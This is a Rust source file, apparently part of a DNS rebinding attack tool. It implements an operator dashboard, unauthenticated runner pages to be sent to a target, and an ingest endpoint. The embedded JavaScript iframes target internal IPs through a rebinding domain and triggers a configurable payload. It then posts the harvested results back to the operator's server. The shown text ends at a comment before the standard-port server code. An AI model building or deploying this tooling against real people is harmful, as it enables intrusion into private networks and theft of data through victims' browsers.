//! The two HTTP servers (built on [`axum`]) that pair with the DNS server.
//!
//! * [`serve_content`] runs on port 3000. Most of it is a **dashboard** (`/`)
//!   gated behind HTTP Basic auth for managing projects and runners. Two routes
//!   are deliberately left open because the target's browser must reach them
//!   without credentials: the **runner** (`/run?rid=…`) that drives the rebinding
//!   attempt, and the **ingest** endpoint (`POST /api/ingest/:rid`) it posts
//!   results back to. Both are gated instead by an unguessable *report ID*.
//! * [`serve_standard`] runs on a standard port (80 by default). It serves the
//!   **rebind frame** (with the active project's payload) and the `GET /stop`
//!   control endpoint.
//!
//! A *project* is a saved set of environment variables plus the JS payload (see
//! [`crate::project`]). The active project lives in shared state, so opening a
//! project immediately changes what the frame serves. Activating a runner mints
//! a report ID and snapshots the active project into a *session*; that runner
//! renders from (and reports under) the snapshot, so later project changes don't
//! disturb a link already handed out. The dashboard logs results per report ID.

use std::collections::HashMap;
use std::net::{IpAddr, Ipv6Addr, SocketAddr};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{Arc, RwLock};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use axum::extract::{Path, Query, Request, State};
use axum::http::{header, HeaderValue, StatusCode};
use axum::middleware::{from_fn, from_fn_with_state, Next};
use axum::response::{Html, IntoResponse, Json, Response};
use axum::routing::{get, post};
use axum::Router;
use rand::RngCore;
use serde::{Deserialize, Serialize};
use serde_json::json;
use socket2::{Domain, Protocol, Socket, Type};
use tokio::net::TcpListener;
use tokio::sync::Notify;

use crate::auth::{self, AuthDb};
use crate::dns::ip_to_label;
use crate::project::{self, Active, Project};

/// How long `/stop` keeps the standard server down when no `seconds` query
/// parameter is supplied.
const DEFAULT_STOP_SECONDS: u64 = 10;

/// Upper bound on how long `/stop` will keep the server offline, regardless of
/// the requested value.
const MAX_STOP_SECONDS: u64 = 20;

/// Middleware that makes every response framable cross-origin. We explicitly
/// drop any `X-Frame-Options` and set `Content-Security-Policy: frame-ancestors
/// *` so the master page (a different origin) can embed these pages in iframes.
async fn allow_framing(req: Request, next: Next) -> Response {
    let mut res = next.run(req).await;
    let headers = res.headers_mut();
    headers.remove(header::X_FRAME_OPTIONS);
    headers.insert(
        header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_static("frame-ancestors *"),
    );
    res
}

// ------------------------------------------------------------------ content

/// Deployment settings that come from the environment / `.env` only and are
/// NOT part of a project (they identify where/how this server runs).
#[derive(Clone)]
pub struct Deploy {
    /// Delegated base domain for the rebind workers, e.g. `rebind.example.com`.
    /// Iframe hosts are built under this; it is what the DNS server is
    /// authoritative for.
    pub hostname: String,
    /// Public base URL the master/runner is reached at (scheme + host + optional
    /// port, no trailing slash), when it differs from the worker
    /// [`Self::hostname`] — e.g. the dashboard is hosted on its own domain,
    /// possibly behind a TLS proxy. The runner link is this plus `/run?rid=…`.
    /// `None` falls back to the operator's current dashboard origin.
    pub master_url: Option<String>,
    /// Public IP of our standard-port server (browsers connect here first).
    pub server_ip: IpAddr,
    /// Real standard-port the server listens on (for iframe URLs / `/stop`).
    pub standard_port: u16,
}

/// Cap on how many reports we retain per runner session (oldest dropped past
/// this).
const MAX_REPORTS_PER_SESSION: usize = 500;

/// A single result/error a runner collected from a rebound frame, sent back to
/// the master and held in memory keyed by project name.
#[derive(Clone, Serialize)]
struct Report {
    /// `"result"` or `"error"`.
    kind: String,
    /// Frame hostname the report came from.
    host: String,
    /// For a result: the arbitrary payload data. For an error: the message.
    data: serde_json::Value,
    /// Unix epoch milliseconds when the master received it.
    time_ms: u64,
}

/// A runner session: one activation of the attack runner, identified by an
/// unguessable report ID. The runner page is served (and posts reports back)
/// unauthenticated using this ID; the master only logs output for IDs it minted.
struct Session {
    /// Snapshot of the project as it was when the runner was activated. The
    /// runner renders from this, so changing the active project later does not
    /// disturb a link already handed to a target.
    project: Project,
    /// Unix epoch milliseconds when the runner was activated.
    created_ms: u64,
    /// Results/errors this session's runner(s) have posted back.
    reports: Vec<Report>,
}

/// Runner sessions keyed by report ID. Lives in memory for the process lifetime.
type Sessions = Arc<RwLock<HashMap<String, Session>>>;

/// Current Unix time in milliseconds (0 if the clock is before the epoch).
fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0)
}

/// Generate an unguessable, URL-safe report ID. Ambiguous characters are
/// omitted so an operator can read/transcribe an ID by hand if needed.
fn new_report_id() -> String {
    const CHARS: &[u8] = b"ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
    let mut rng = rand::thread_rng();
    (0..24)
        .map(|_| CHARS[(rng.next_u32() as usize) % CHARS.len()] as char)
        .collect()
}

/// Shared state for the master/content server.
#[derive(Clone)]
struct MasterState {
    /// Currently-active project (shared with the standard server).
    active: Active,
    /// Environment-only deployment settings.
    deploy: Deploy,
    /// Payload used to seed brand-new projects (the startup payload).
    default_payload: Arc<String>,
    /// Runner sessions keyed by report ID.
    sessions: Sessions,
}

/// Bind a TCP listener for `bind`, serving both IPv4 and IPv6 on the same port.
///
/// When `bind` is a wildcard address (`0.0.0.0:p` or `[::]:p`), we bind a single
/// dual-stack IPv6 socket (`[::]:p` with `IPV6_V6ONLY` disabled) so the server
/// answers on both families — needed because a victim resolving the rebind name
/// over AAAA connects to us over IPv6. A specific (non-wildcard) address is bound
/// as-is on its own family, and anything that doesn't parse as a socket address
/// (e.g. a `host:port`) falls back to tokio's resolver.
async fn bind_listener(bind: &str) -> std::io::Result<TcpListener> {
    let addr: SocketAddr = match bind.parse() {
        Ok(a) => a,
        Err(_) => return TcpListener::bind(bind).await,
    };
    if !addr.ip().is_unspecified() {
        return TcpListener::bind(addr).await;
    }
    let dual = SocketAddr::new(IpAddr::V6(Ipv6Addr::UNSPECIFIED), addr.port());
    let socket = Socket::new(Domain::IPV6, Type::STREAM, Some(Protocol::TCP))?;
    socket.set_only_v6(false)?; // accept IPv4 (as v4-mapped) and IPv6
    socket.set_reuse_address(true)?; // allow quick rebind after a /stop pause
    socket.bind(&dual.into())?;
    socket.listen(1024)?;
    socket.set_nonblocking(true)?;
    TcpListener::from_std(socket.into())
}

/// Serve the dashboard + runner + project API on `bind` (default `:3000`).
pub async fn serve_content(
    bind: &str,
    active: Active,
    deploy: Deploy,
    default_payload: String,
    auth_db: AuthDb,
) -> Result<(), Box<dyn std::error::Error>> {
    let state = MasterState {
        active,
        deploy,
        default_payload: Arc::new(default_payload),
        sessions: Arc::new(RwLock::new(HashMap::new())),
    };

    // Open routes: served WITHOUT auth. The runner page is loaded by the target's
    // browser, and that browser posts results back — neither can authenticate.
    // Both are gated instead by the unguessable report ID minted by the master.
    let open = Router::new()
        .route("/run", get(runner))
        .route("/api/ingest/:rid", post(api_ingest));

    // Protected routes: the operator's control plane, behind HTTP Basic auth.
    let protected = Router::new()
        .route("/", get(dashboard))
        .route("/api/projects", get(api_list))
        .route("/api/defaults", get(api_defaults))
        .route("/api/deploy", get(api_deploy))
        .route(
            "/api/project/:name",
            get(api_get).post(api_save).delete(api_delete),
        )
        .route("/api/runner", post(api_runner_create))
        .route("/api/runners", get(api_runners_list))
        .route(
            "/api/reports/:rid",
            get(api_reports_get).delete(api_reports_clear),
        )
        .route("/api/open/:name", post(api_open))
        .route("/api/active", get(api_active).post(api_set_active))
        // Gate every master route behind HTTP Basic auth. The open routes above
        // and the standard-port server are deliberately left reachable.
        .layer(from_fn_with_state(auth_db, auth::require_auth));

    let app = open
        .merge(protected)
        .layer(from_fn(allow_framing))
        .with_state(state);

    let listener = bind_listener(bind).await?;
    tracing::info!("content listening on http://{bind} (dashboard / ; runner /run?rid=…)");
    axum::serve(listener, app).await?;
    Ok(())
}

// ---- project API ----

#[derive(Deserialize)]
struct ProjectBody {
    #[serde(default)]
    targets: Vec<String>,
    #[serde(default)]
    stop_seconds: u64,
    #[serde(default)]
    pad: usize,
    #[serde(default)]
    payload: String,
}

async fn api_list() -> Json<Vec<String>> {
    Json(project::list())
}

async fn api_defaults(State(s): State<MasterState>) -> Json<Project> {
    Json(Project::default_from_env("", &s.default_payload))
}

async fn api_deploy(State(s): State<MasterState>) -> Json<serde_json::Value> {
    Json(json!({
        "hostname": s.deploy.hostname,
        "master_url": s.deploy.master_url,
        "server_ip": s.deploy.server_ip.to_string(),
        "standard_port": s.deploy.standard_port,
    }))
}

async fn api_get(Path(name): Path<String>) -> Result<Json<Project>, (StatusCode, String)> {
    project::load(&name)
        .map(Json)
        .map_err(|e| (StatusCode::NOT_FOUND, e.to_string()))
}

async fn api_save(
    State(s): State<MasterState>,
    Path(name): Path<String>,
    Json(body): Json<ProjectBody>,
) -> Result<Json<Project>, (StatusCode, String)> {
    let project = Project {
        name,
        targets: body.targets,
        stop_seconds: body.stop_seconds.min(20),
        pad: body.pad.min(project::MAX_PAD),
        payload: body.payload,
    };
    project::save(&project).map_err(|e| (StatusCode::BAD_REQUEST, e.to_string()))?;
    *s.active.write().unwrap() = project.clone();
    tracing::info!("saved & activated project '{}'", project.name);
    Ok(Json(project))
}

async fn api_delete(Path(name): Path<String>) -> Result<StatusCode, (StatusCode, String)> {
    project::delete(&name).map_err(|e| {
        let code = if e.kind() == std::io::ErrorKind::NotFound {
            StatusCode::NOT_FOUND
        } else {
            StatusCode::BAD_REQUEST
        };
        (code, e.to_string())
    })?;
    tracing::info!("deleted project '{name}'");
    Ok(StatusCode::NO_CONTENT)
}

/// Activate a runner: mint a fresh report ID, snapshot the active project, and
/// return the ID plus the (relative) runner URL to hand to the target.
async fn api_runner_create(State(s): State<MasterState>) -> Json<serde_json::Value> {
    let project = s.active.read().unwrap().clone();
    let rid = new_report_id();
    s.sessions.write().unwrap().insert(
        rid.clone(),
        Session {
            project: project.clone(),
            created_ms: now_ms(),
            reports: Vec::new(),
        },
    );
    tracing::info!("activated runner '{rid}' for project '{}'", project.name);
    Json(json!({
        "rid": rid,
        "project": project.name,
        "url": format!("/run?rid={rid}"),
    }))
}

/// Summary of a runner session for the operator's runner list.
#[derive(Serialize)]
struct RunnerSummary {
    rid: String,
    project: String,
    created_ms: u64,
    count: usize,
}

/// List active runner sessions, newest first.
async fn api_runners_list(State(s): State<MasterState>) -> Json<Vec<RunnerSummary>> {
    let map = s.sessions.read().unwrap();
    let mut list: Vec<RunnerSummary> = map
        .iter()
        .map(|(rid, sess)| RunnerSummary {
            rid: rid.clone(),
            project: sess.project.name.clone(),
            created_ms: sess.created_ms,
            count: sess.reports.len(),
        })
        .collect();
    list.sort_by(|a, b| b.created_ms.cmp(&a.created_ms));
    Json(list)
}

#[derive(Deserialize)]
struct ReportBody {
    kind: String,
    #[serde(default)]
    host: String,
    #[serde(default)]
    data: serde_json::Value,
}

/// Ingest a result/error from a runner. Unauthenticated, but accepted only for a
/// report ID the master actually minted — unknown IDs are rejected, not stored.
async fn api_ingest(
    State(s): State<MasterState>,
    Path(rid): Path<String>,
    Json(body): Json<ReportBody>,
) -> StatusCode {
    let mut map = s.sessions.write().unwrap();
    let Some(sess) = map.get_mut(&rid) else {
        return StatusCode::NOT_FOUND;
    };
    sess.reports.push(Report {
        kind: body.kind,
        host: body.host,
        data: body.data,
        time_ms: now_ms(),
    });
    if sess.reports.len() > MAX_REPORTS_PER_SESSION {
        let overflow = sess.reports.len() - MAX_REPORTS_PER_SESSION;
        sess.reports.drain(0..overflow);
    }
    StatusCode::NO_CONTENT
}

/// Return the reports logged for a report ID (`404` if the ID is unknown).
async fn api_reports_get(
    State(s): State<MasterState>,
    Path(rid): Path<String>,
) -> Result<Json<Vec<Report>>, StatusCode> {
    let map = s.sessions.read().unwrap();
    match map.get(&rid) {
        Some(sess) => Ok(Json(sess.reports.clone())),
        None => Err(StatusCode::NOT_FOUND),
    }
}

/// Delete a runner session (its report ID stops accepting reports).
async fn api_reports_clear(State(s): State<MasterState>, Path(rid): Path<String>) -> StatusCode {
    s.sessions.write().unwrap().remove(&rid);
    StatusCode::NO_CONTENT
}

async fn api_open(
    State(s): State<MasterState>,
    Path(name): Path<String>,
) -> Result<Json<Project>, (StatusCode, String)> {
    let project = project::load(&name).map_err(|e| (StatusCode::NOT_FOUND, e.to_string()))?;
    *s.active.write().unwrap() = project.clone();
    tracing::info!("opened & activated project '{}'", project.name);
    Ok(Json(project))
}

async fn api_active(State(s): State<MasterState>) -> Json<Project> {
    Json(s.active.read().unwrap().clone())
}

async fn api_set_active(
    State(s): State<MasterState>,
    Json(project): Json<Project>,
) -> Json<Project> {
    *s.active.write().unwrap() = project.clone();
    tracing::info!("set active (unsaved) project '{}'", project.name);
    Json(project)
}

// ---- pages ----

async fn dashboard() -> Html<&'static str> {
    Html(DASHBOARD_HTML)
}

#[derive(Deserialize)]
struct RunnerQuery {
    #[serde(default)]
    rid: String,
}

/// Serve the (unauthenticated) runner page for a report ID. The page and its
/// config come from the session snapshot; an unknown/expired ID gets a `404`.
async fn runner(State(s): State<MasterState>, Query(q): Query<RunnerQuery>) -> Response {
    let project = s
        .sessions
        .read()
        .unwrap()
        .get(&q.rid)
        .map(|sess| sess.project.clone());
    match project {
        Some(project) => Html(render_runner(&project, &s.deploy, &q.rid)).into_response(),
        None => (StatusCode::NOT_FOUND, Html(RUNNER_INVALID_HTML)).into_response(),
    }
}

/// Shown when `/run` is hit without a valid report ID (e.g. a stale link).
const RUNNER_INVALID_HTML: &str = "<!doctype html><meta charset=\"utf-8\">\
<title>rebind</title><p>Invalid or expired link.</p>";

/// Render the runner page. Deployment values (hostname, server IP, port) come
/// from the environment; the targets/stop window come from the session's project
/// snapshot. `rid` is the report ID this runner posts its results back under.
fn render_runner(project: &Project, deploy: &Deploy, rid: &str) -> String {
    let server_ip = deploy.server_ip;
    let standard_port = deploy.standard_port;
    let targets_js = project
        .target_ips()
        .iter()
        .map(|ip| format!("{{ip:{:?},label:{:?}}}", ip.to_string(), ip_to_label(*ip)))
        .collect::<Vec<_>>()
        .join(",");

    format!(
        r#"<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>rebind :: runner</title>
<style>
  body {{ font-family: system-ui, sans-serif; margin: 1.5rem; }}
  #log {{ white-space: pre-wrap; font-family: monospace; background:#111; color:#0f0;
          padding:1rem; border-radius:6px; min-height:8rem; }}
  iframe {{ width: 360px; height: 70px; border: 1px solid #ccc; margin: 4px; }}
  .frame-label {{ font-family: monospace; font-size: 12px; color:#555; }}
  a {{ color:#06c; }}
</style>
</head>
<body>
  <h1>rebind runner &mdash; project: {project_name}</h1>
  <p>One iframe per target. Each loads
     <code>&lt;target_ip&gt;.&lt;random&gt;.{hostname}</code>; the DNS server adds
     this server's IP to the answer (from config), so the browser lands here
     first. The master pings each frame; frames that don't pong are reloaded
     with a fresh random label until they point at this server.</p>
  <div id="frames"></div>
  <h2>Log</h2>
  <div id="log"></div>

<script>
const HOSTNAME      = {hostname:?};
const SERVER_IP     = {server_ip:?};
const STANDARD_PORT = {standard_port};
const STOP_SECONDS  = {stop_seconds};
const TARGETS       = [{targets_js}];
const PROJECT_NAME  = {project_name:?};
const REPORT_ID     = {rid:?};

// Forward a collected result/error back to the master under this runner's
// report ID. The endpoint is unauthenticated but only accepts a minted ID.
async function sendReport(kind, host, data) {{
  if (!REPORT_ID) return;
  try {{
    await fetch("/api/ingest/" + encodeURIComponent(REPORT_ID), {{
      method: "POST",
      headers: {{ "content-type": "application/json" }},
      body: JSON.stringify({{ kind, host, data }}),
    }});
  }} catch (e) {{ log("report POST failed: " + e); }}
}}

const PING_INTERVAL = 1500;
const PONG_TIMEOUT  = 600;
const EXECUTE_DELAY = 600;

const PORT_SUFFIX = STANDARD_PORT === 80 ? "" : ":" + STANDARD_PORT;
const logEl = document.getElementById('log');
function log(m) {{ logEl.textContent += m + "\n"; console.log(m); }}

function rnd() {{ return "r" + Math.random().toString(36).slice(2, 10); }}
function hostFor(t) {{ return t.label + "." + rnd() + "." + HOSTNAME; }}

let nonceCounter = 0;
let executed = false;
const frames = [];

function build() {{
  const container = document.getElementById('frames');
  if (!TARGETS.length) {{ log("no targets configured for this project"); return; }}
  TARGETS.forEach((t, i) => {{
    const f = {{ id: i, target: t, host: hostFor(t), confirmed: false,
                lastNonce: 0, awaiting: false }};
    const wrap = document.createElement('div');
    f.cap = document.createElement('div');
    f.cap.className = 'frame-label';
    f.el = document.createElement('iframe');
    f.el.src = "http://" + f.host + PORT_SUFFIX + "/";
    f.cap.textContent = "target " + t.ip + "  via  " + f.host;
    wrap.appendChild(f.cap);
    wrap.appendChild(f.el);
    container.appendChild(wrap);
    frames.push(f);
    log("frame " + i + " -> " + f.host);
  }});
}}

function reload(f) {{
  f.host = hostFor(f.target);
  f.confirmed = false;
  f.awaiting = false;
  f.cap.textContent = "target " + f.target.ip + "  via  " + f.host;
  f.el.src = "http://" + f.host + PORT_SUFFIX + "/";
}}

function tick() {{
  if (executed) return;
  if (frames.length && frames.every((f) => f.confirmed)) return onAllConfirmed();
  frames.forEach((f) => {{
    if (f.confirmed) return;
    const nonce = ++nonceCounter;
    f.lastNonce = nonce;
    f.awaiting = true;
    try {{ f.el.contentWindow.postMessage({{ type: "ping", nonce, id: f.id }}, "*"); }}
    catch (e) {{}}
    setTimeout(() => {{
      if (executed || f.confirmed) return;
      if (f.awaiting && f.lastNonce === nonce) {{
        log("frame " + f.id + " (" + f.target.ip + ") no pong -> reload w/ fresh random");
        reload(f);
      }}
    }}, PONG_TIMEOUT);
  }});
  setTimeout(tick, PING_INTERVAL);
}}

window.addEventListener('message', (e) => {{
  const d = e.data || {{}};
  if (d.type === "pong") {{
    const f = frames.find((x) => x.lastNonce === d.nonce);
    if (f && !f.confirmed) {{
      f.confirmed = true;
      f.awaiting = false;
      const n = frames.filter((x) => x.confirmed).length;
      log("pong: frame " + f.id + " (" + f.target.ip + ") on our server (" +
          n + "/" + frames.length + ")");
      if (frames.every((x) => x.confirmed)) onAllConfirmed();
    }}
  }} else if (d.type === "result") {{
    const f = frames.find((x) => x.host === d.host);
    log("PAYLOAD frame " + (f ? f.id : "?") + " " + d.host + " -> " +
        JSON.stringify(d.data));
    sendReport("result", d.host, d.data);
  }} else if (d.type === "error") {{
    const f = frames.find((x) => x.host === d.host);
    log("ERROR frame " + (f ? f.id : "?") + " " + d.host + ": " + d.error);
    sendReport("error", d.host, d.error);
  }}
}});

async function onAllConfirmed() {{
  if (executed) return;
  executed = true;
  log("all " + frames.length + " frame(s) confirmed on our server");
  log("calling /stop on " + SERVER_IP + " for " + STOP_SECONDS + "s");
  try {{
    await fetch("http://" + SERVER_IP + PORT_SUFFIX + "/stop?seconds=" + STOP_SECONDS,
                {{ mode: "no-cors" }});
  }} catch (e) {{ log("stop fetch error (continuing): " + e); }}
  await new Promise((r) => setTimeout(r, EXECUTE_DELAY));
  log("signaling frames to execute (origin now fails over to target)");
  frames.forEach((f) => {{
    try {{ f.el.contentWindow.postMessage({{ type: "execute" }}, "*"); }} catch (e) {{}}
  }});
}}

build();
setTimeout(tick, 500);
</script>
</body>
</html>
"#,
        project_name = project.name,
        hostname = deploy.hostname,
        server_ip = server_ip.to_string(),
        standard_port = standard_port,
        stop_seconds = project.stop_seconds_clamped(),
        targets_js = targets_js,
        rid = rid,
    )
}

/// The project-management dashboard (a small vanilla-JS SPA over the API).
const DASHBOARD_HTML: &str = r##"<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>rebind :: projects</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 1.5rem; }
  .wrap { display: flex; gap: 2rem; align-items: flex-start; }
  .side { min-width: 240px; }
  .main { flex: 1; max-width: 900px; }
  ul { list-style: none; padding: 0; }
  li { display: flex; justify-content: space-between; gap: .5rem; margin: .25rem 0; }
  input, textarea { font-family: monospace; }
  textarea, input.wide { width: 100%; box-sizing: border-box; }
  button { cursor: pointer; }
  label { display: block; margin: .5rem 0; }
  #advanced { margin: .5rem 0; border:1px solid #ddd; border-radius:6px; padding:.25rem .75rem; background:#fafafa; }
  #advanced summary { cursor:pointer; font-weight:600; padding:.25rem 0; }
  #deploy { background:#f4f4f4; border-radius:6px; padding:.5rem .75rem; font-size:13px; }
  #deploy code { color:#333; }
  #status { background:#111; color:#0f0; padding:.5rem; border-radius:6px; min-height:1.5rem; white-space:pre-wrap; }
  h1 a, .side a { color:#06c; text-decoration:none; }
  #reports { margin-top:.5rem; }
  .report { border:1px solid #ddd; border-left-width:4px; border-radius:4px; margin:.4rem 0; padding:.4rem .6rem; }
  .report.result { border-left-color:#2a2; }
  .report.error { border-left-color:#c33; }
  .report .rhead { font-family:monospace; font-size:12px; color:#555; }
  .report pre { margin:.3rem 0 0; white-space:pre-wrap; word-break:break-all; }
  #runners .runner { display:flex; justify-content:space-between; align-items:center; gap:.5rem;
                     border:1px solid #ddd; border-radius:4px; margin:.3rem 0; padding:.3rem .5rem; }
  #runners .runner.sel { border-color:#06c; background:#eef5ff; }
  #runners .meta { font-family:monospace; font-size:12px; }
  #runnerlink code { font-family:monospace; font-size:12px; word-break:break-all; }
</style>
</head>
<body>
  <h1>rebind &mdash; projects</h1>
  <div class="wrap">
    <div class="side">
      <h2>Projects</h2>
      <ul id="projlist"></ul>
      <button id="newbtn">+ New (from .env defaults)</button>
      <p>Active: <b id="activename">&mdash;</b></p>
      <p><button id="activaterunner">Activate runner &#8599;</button></p>
      <p id="runnerlink"></p>
      <h3>Deployment <small>(.env only)</small></h3>
      <div id="deploy">loading&hellip;</div>
    </div>
    <div class="main">
      <h2>Project configuration</h2>
      <label>Name <input id="name" class="wide" placeholder="project-name"></label>
      <label>Targets <small>(comma-separated IPs &mdash; one iframe each)</small>
        <input id="targets" class="wide" placeholder="10.0.0.5, 10.0.0.6"></label>
      <details id="advanced">
        <summary>Advanced settings</summary>
        <label>Stop seconds <small>(max 20)</small>
          <input id="stop" type="number" min="0" max="20"></label>
        <label>DNS padding <small>(extra server-IP records returned alongside the target; the server IP is always included once; max 16)</small>
          <input id="pad" type="number" min="0" max="16"></label>
      </details>
      <label>Payload &mdash; <code>async function runPayload(rebind)</code>
        <textarea id="payload" rows="16"></textarea></label>
      <p>
        <button id="savebtn">Save &amp; Activate</button>
        <button id="activatebtn">Set Active (no save)</button>
      </p>
      <pre id="status"></pre>

      <h2>Runners</h2>
      <div id="runners">No runners activated yet.</div>

      <h2>Reports <small id="reportsfor">(no runner selected)</small></h2>
      <p>
        <button id="refreshreports">Refresh</button>
        <button id="clearreports">Delete runner</button>
        <small>auto-refreshes every 3s while a runner is selected</small>
      </p>
      <div id="reports">Activate a runner and send its link to the target.</div>
    </div>
  </div>

<script>
const $ = (id) => document.getElementById(id);
function status(m) { $("status").textContent = m; }

async function api(method, path, body) {
  const opt = { method, headers: {} };
  if (body !== undefined) {
    opt.headers["content-type"] = "application/json";
    opt.body = JSON.stringify(body);
  }
  const res = await fetch(path, opt);
  if (!res.ok) throw new Error(method + " " + path + " -> " + res.status + " " + (await res.text()));
  const ct = res.headers.get("content-type") || "";
  return ct.includes("json") ? res.json() : res.text();
}

function readForm() {
  const targets = $("targets").value.split(",").map((s) => s.trim()).filter((s) => s);
  return {
    name: $("name").value.trim(),
    targets,
    stop_seconds: Math.min(20, parseInt($("stop").value, 10) || 0),
    pad: Math.min(16, Math.max(0, parseInt($("pad").value, 10) || 0)),
    payload: $("payload").value,
  };
}

function fillForm(p) {
  $("name").value = p.name || "";
  $("targets").value = (p.targets || []).join(", ");
  $("stop").value = p.stop_seconds ?? 5;
  $("pad").value = p.pad ?? 0;
  $("payload").value = p.payload || "";
}

async function refreshProjects() {
  const list = await api("GET", "/api/projects");
  const ul = $("projlist");
  ul.innerHTML = "";
  if (!list.length) ul.innerHTML = "<li><i>(none saved)</i></li>";
  list.forEach((n) => {
    const li = document.createElement("li");
    li.innerHTML = "<span></span> <span><button class='open'>Open</button> <button class='del'>Delete</button></span>";
    li.querySelector("span").textContent = n;
    li.querySelector("button.open").onclick = () => openProject(n);
    li.querySelector("button.del").onclick = () => deleteProject(n);
    ul.appendChild(li);
  });
}

async function deleteProject(n) {
  if (!confirm("Delete project \"" + n + "\"? This cannot be undone.")) return;
  try {
    await api("DELETE", "/api/project/" + encodeURIComponent(n));
    await refreshProjects();
    status("Deleted: " + n);
  } catch (e) { status(String(e)); }
}

let deployInfo = null;

async function loadDeploy() {
  const d = await api("GET", "/api/deploy");
  deployInfo = d;
  const port = d.standard_port === 80 ? "" : ":" + d.standard_port;
  let html = "worker hostname: <code></code><br>server IP: <code></code>" +
             "<br>standard port: <code></code>";
  if (d.master_url) html += "<br>master URL: <code></code>";
  $("deploy").innerHTML = html;
  const codes = $("deploy").querySelectorAll("code");
  codes[0].textContent = d.hostname;
  codes[1].textContent = d.server_ip;
  codes[2].textContent = d.standard_port + port;
  if (d.master_url) codes[3].textContent = d.master_url;
}

// Build the runner link to hand to a target. When a master base URL is
// configured we point at it (it carries scheme/host/port); otherwise we use the
// operator's current dashboard origin.
function runnerLink(relUrl) {
  if (deployInfo && deployInfo.master_url) {
    return deployInfo.master_url + relUrl;
  }
  return location.origin + relUrl;
}

let scopedRid = null;
let reportTimer = null;

function renderReports(items) {
  const box = $("reports");
  if (!items || !items.length) { box.innerHTML = "<i>(no reports yet)</i>"; return; }
  box.innerHTML = "";
  items.slice().reverse().forEach((r) => {
    const div = document.createElement("div");
    div.className = "report " + (r.kind === "error" ? "error" : "result");
    const head = document.createElement("div");
    head.className = "rhead";
    const t = new Date(r.time_ms).toLocaleTimeString();
    head.textContent = "[" + t + "] " + r.kind.toUpperCase() + "  " + r.host;
    const body = document.createElement("pre");
    body.textContent = typeof r.data === "string" ? r.data : JSON.stringify(r.data, null, 2);
    div.appendChild(head);
    div.appendChild(body);
    box.appendChild(div);
  });
}

async function loadReports() {
  if (!scopedRid) return;
  try {
    const items = await api("GET", "/api/reports/" + encodeURIComponent(scopedRid));
    renderReports(items);
  } catch (e) {
    // The session was deleted (404) or another error occurred: stop polling.
    selectRunner(null);
  }
}

function selectRunner(rid) {
  scopedRid = rid || null;
  if (reportTimer) { clearInterval(reportTimer); reportTimer = null; }
  if (scopedRid) {
    $("reportsfor").textContent = "(report id: " + scopedRid + ")";
    loadReports();
    reportTimer = setInterval(loadReports, 3000);
  } else {
    $("reportsfor").textContent = "(no runner selected)";
    $("reports").innerHTML = "Activate a runner and send its link to the target.";
  }
  markSelectedRunner();
}

function markSelectedRunner() {
  document.querySelectorAll("#runners .runner").forEach((el) => {
    el.classList.toggle("sel", el.dataset.rid === scopedRid);
  });
}

async function refreshRunners() {
  const list = await api("GET", "/api/runners");
  const box = $("runners");
  box.innerHTML = "";
  if (!list.length) { box.innerHTML = "No runners activated yet."; return; }
  list.forEach((r) => {
    const div = document.createElement("div");
    div.className = "runner";
    div.dataset.rid = r.rid;
    const meta = document.createElement("span");
    meta.className = "meta";
    const t = new Date(r.created_ms).toLocaleTimeString();
    meta.textContent = r.project + " · " + r.rid.slice(0, 8) + "… · " +
                       r.count + " report(s) · " + t;
    const btns = document.createElement("span");
    const view = document.createElement("button");
    view.textContent = "View";
    view.onclick = () => selectRunner(r.rid);
    const del = document.createElement("button");
    del.textContent = "Delete";
    del.onclick = () => deleteRunner(r.rid);
    btns.appendChild(view);
    btns.appendChild(document.createTextNode(" "));
    btns.appendChild(del);
    div.appendChild(meta);
    div.appendChild(btns);
    box.appendChild(div);
  });
  markSelectedRunner();
}

async function activateRunner() {
  try {
    const r = await api("POST", "/api/runner");
    const url = runnerLink(r.url);
    $("runnerlink").innerHTML = "Runner link (send to target):<br><code></code>";
    $("runnerlink").querySelector("code").textContent = url;
    await refreshRunners();
    selectRunner(r.rid);
    status("Activated runner for '" + r.project + "' — report id " + r.rid);
  } catch (e) { status(String(e)); }
}

async function deleteRunner(rid) {
  if (!confirm("Delete this runner and its reports? The link will stop working.")) return;
  await api("DELETE", "/api/reports/" + encodeURIComponent(rid));
  if (scopedRid === rid) selectRunner(null);
  await refreshRunners();
}

async function clearReports() {
  if (scopedRid) await deleteRunner(scopedRid);
}

async function openProject(n) {
  const p = await api("POST", "/api/open/" + encodeURIComponent(n));
  fillForm(p);
  $("activename").textContent = p.name;
  status("Opened & activated: " + p.name);
}

async function newProject() {
  const p = await api("GET", "/api/defaults");
  fillForm(p);
  $("name").value = "";
  status("New project seeded from .env defaults. Set a name and Save.");
}

async function save() {
  const p = readForm();
  if (!p.name) { status("Please set a project name (letters, digits, - and _ only)."); return; }
  try {
    const saved = await api("POST", "/api/project/" + encodeURIComponent(p.name),
                            { targets: p.targets, stop_seconds: p.stop_seconds, pad: p.pad, payload: p.payload });
    await refreshProjects();
    $("activename").textContent = saved.name;
    status("Saved & activated: " + saved.name);
  } catch (e) { status(String(e)); }
}

async function activate() {
  const p = readForm();
  await api("POST", "/api/active", p);
  $("activename").textContent = p.name || "(unsaved)";
  status("Set active (not saved): " + (p.name || "(unsaved)"));
}

async function init() {
  $("newbtn").onclick = newProject;
  $("savebtn").onclick = save;
  $("activatebtn").onclick = activate;
  $("activaterunner").onclick = activateRunner;
  $("refreshreports").onclick = loadReports;
  $("clearreports").onclick = clearReports;
  await loadDeploy();
  await refreshProjects();
  await refreshRunners();
  const active = await api("GET", "/api/active");
  fillForm(active);
  $("activename").textContent = active.name || "(unsaved)";
}
init();
</script>
</body>
</html>
"##;

// ----------------------------------------------------------------- standard

/// Shared state for the standard-port server.
struct AppState {
    /// Fired by `/stop` to trigger graceful shutdown of the current listener.
    notify: Notify,
    /// How many seconds the server should stay down after the next stop.
    seconds: AtomicU64,
    /// Active project (used to render the frame payload per request).
    active: Active,
}

/// Serve on a standard port (`bind`, default `0.0.0.0:80`). Serves the rebind
/// frame (with the active project's payload) and the `/stop` control endpoint.
